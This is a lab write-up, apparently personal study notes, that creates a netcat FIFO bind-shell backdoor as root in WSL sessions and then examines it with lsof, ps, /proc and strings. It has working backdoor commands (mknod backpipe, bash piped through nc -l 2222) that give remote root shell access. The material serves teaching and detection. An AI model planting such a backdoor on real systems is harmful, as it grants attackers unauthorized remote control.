---
layout: default
---
[Back](./)

## FIFO Backdoor (First In First Out)
Running 3 WSL linux sessions
The first will be where we run the backdoor.
The second will be where we connect to it.
The third is where we will be running our analysis.

**Machine 1**

Create the backdoor
1. Elevate to root `sudo su`
2. Create a fifi backpipe `mknod backpipe p`
3. Start the backdoor `/bin/bash 0<backpipe | nc -l 2222 1>backpipe`
> In the above command we are creating a netcat listener that forwards all input through a backpipe and then into a bash session. It then takes the output of the bash session and puts it back into the netcat listener.

**Machine 2**

Connect to this backdoor
1. Get IP address info `ip add`
2. Run netcat on the IP + Port `nc 172.20.146.40 2222`

**Machine 1**

Analyze the backdoor
1. Open another tab on the original machine to analyse the backdoor connection using `lsof -i -P` Output:
```
COMMAND    PID            USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
nc        1757            root    3u  IPv4  48020      0t0  TCP *:2222 (LISTEN)
nc        1757            root    4u  IPv4  48021      0t0  TCP 172.20.146.40:2222->172.20.146.40:45500 (ESTABLISHED)
```
| Flag        | Defined          |
|:-------------|:------------------|
|-i       |Looking at the open Internet connections.|
|-P       |Telling lsof to not guess what the service is on the ports. Just give us the port number.|
|-p       |List open files associated with the listed process ID.|

2. List open files associated with the listed process ID. `sudo lsof -p 1757`
Output::
```
COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF  NODE NAME
nc      1757 root  cwd    DIR   8,32     4096 40961 /root
nc      1757 root  rtd    DIR   8,32     4096     2 /
nc      1757 root  txt    REG   8,32    39560  1590 /usr/bin/nc.openbsd
nc      1757 root  mem    REG   8,32    47472  6689 /usr/lib/x86_64-linux-gnu/libmd.so.0.0.5
nc      1757 root  mem    REG   8,32  2216304  6521 /usr/lib/x86_64-linux-gnu/libc.so.6
nc      1757 root  mem    REG   8,32    68552  6801 /usr/lib/x86_64-linux-gnu/libresolv.so.2
nc      1757 root  mem    REG   8,32    89096  6517 /usr/lib/x86_64-linux-gnu/libbsd.so.0.11.5
nc      1757 root  mem    REG   8,32   240936  6325 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
nc      1757 root    0r  FIFO   0,12      0t0 51879 pipe
nc      1757 root    1w  FIFO   8,32      0t0  6659 /root/backpipe
nc      1757 root    2u   CHR  136,2      0t0     5 /dev/pts/2
nc      1757 root    3u  IPv4  48020      0t0   TCP *:2222 (LISTEN)
nc      1757 root    4u  IPv4  48021      0t0   TCP 172.20.146.40:2222->172.20.146.40:45500 (ESTABLISHED)
```
3. List all of the proccesses on the system for all users. `ps aux`
Output:
```
bandit      1657  0.0  0.0   6080  5064 pts/3    Ss   22:01   0:00 -bash
root        1755  0.0  0.0   4780  3196 pts/2    S+   23:54   0:00 bash /home/bandit/fifo-backdoor.sh
root        1756  0.0  0.0   4912  3624 pts/2    S+   23:54   0:00 /bin/bash
**root        1757  0.0  0.0   3532  1220 pts/2    S+   23:54   0:00 nc -l 2222**
bandit      1769  0.0  0.0   7480  3244 pts/3    R+   23:55   0:00 ps aux
```
>-   The output includes information such as the process ID (PID), the user who started the process (USER), the CPU and memory usage, and the command that initiated the process (COMMAND).
>-   The command displays both active processes and those in a "zombie" or "defunct" state.
>-   "ps aux" gives a comprehensive view of the system's current process landscape and can be useful for monitoring system activity, identifying resource-intensive processes, and troubleshooting issues.
4. Change into the proc directory for that pid. `cd /proc/1757` `ls`
Output:
```
ls: cannot read symbolic link 'cwd': Permission denied
ls: cannot read symbolic link 'root': Permission denied
ls: cannot read symbolic link 'exe': Permission denied
arch_status  comm             fd         maps        ns             projid_map  smaps_rollup  task
attr         coredump_filter  fdinfo     mem         oom_adj        root        stack         timens_offsets
auxv         cpuset           gid_map    mountinfo   oom_score      sched       stat          timers
cgroup       cwd              io         mounts      oom_score_adj  schedstat   statm         timerslack_ns
clear_refs   environ          limits     mountstats  pagemap        setgroups   status        uid_map
cmdline      exe              map_files  net         personality    smaps       syscall       wchan
```
> **/proc**  contains a virtual file system that provides information about running processes it does **not exist on the drive.** It allows us to see data associated with the various processes **directly**. This can be very usesfull as it allows us to **dig into the memory of a process that is currently running on a suspect system.**
5. Identigy exactly what the program doing `strings ./exe`
Output:
```
usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
          [-m minttl] [-O length] [-P proxy_username] [-p source_port]
          [-q seconds] [-s sourceaddr] [-T keyword] [-V rtable] [-W recvlimit]
          [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]]
          [destination] [port]
        Command Summary:
                -4              Use IPv4
                -6              Use IPv6
                -b              Allow broadcast
                -C              Send CRLF as line-ending
```

> Now we can see the actual usage information for netcat
> We can run strings on the exe in this directory. This is very, very useful as when programs are created there may be usage information, mentions of system libraries and possible code comments. We use this all the time to attempt to identify what exactly a program is doing.

[Back](./)

